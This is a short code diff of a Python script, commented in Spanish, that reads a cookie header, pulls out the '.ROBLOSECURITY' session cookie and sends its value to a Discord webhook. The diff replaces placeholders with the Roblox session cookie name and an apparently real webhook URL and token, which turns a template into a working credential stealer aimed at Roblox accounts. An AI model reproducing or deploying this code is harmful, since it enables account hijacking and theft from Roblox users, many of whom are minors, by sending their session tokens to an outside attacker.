@@ -9,13 +9,13 @@ cookie = SimpleCookie()
 cookie.load(cookie_header)
 
 # Elige el nombre de la cookie que quieres obtener
-cookie_name = "cookie_name"
+cookie_name = ".ROBLOSECURITY"
 
 # Extrae el valor de la cookie específica
 cookie_value = cookie[cookie_name].value if cookie_name in cookie else None
 
 # Configura la URL del webhook de Discord
-webhook_url = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'
+webhook_url = 'https://discord.com/api/webhooks/1279705139581685781/VjDVjrZmdfJ3e7Wny2ZpHzK7TDHHtKkaTR7ptLFK4-SqudMqTKQdwrPjAqqE3i7SZQZu'
 
 # Si encontramos el valor de la cookie, lo enviamos a Discord
 if cookie_value:
